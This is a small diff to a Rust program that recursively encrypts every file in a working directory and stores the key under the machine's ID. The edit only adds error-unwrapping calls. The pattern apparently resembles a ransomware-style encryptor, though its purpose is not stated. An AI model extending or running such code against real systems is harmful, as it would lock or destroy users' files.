@@ -39,7 +39,7 @@ fn main() {
         exit_with_help();
     }
     // TODO: Check if dir is already encrypted to avoid encrypting multiple times
-    perform_action_on_directory(&encryption_key, &Action::Encrypt, working_directory);
+    perform_action_on_directory(&encryption_key, &Action::Encrypt, working_directory).unwrap();
 
     store_key(&machine_id, &encryption_key);
 
@@ -58,7 +58,7 @@ fn perform_action_on_directory(encryption_key: &String, action: &Action, working
                 encryption_key,
                 action,
                 dir_entry.path().as_os_str().to_str().unwrap(),
-            );
+            ).unwrap();
         } else {
             let mut file = fs::OpenOptions::new().read(true).write(true).open(dir_entry.path().as_os_str()).unwrap();
             println!("{}::{}...", action, dir_entry.file_name().into_string().unwrap());
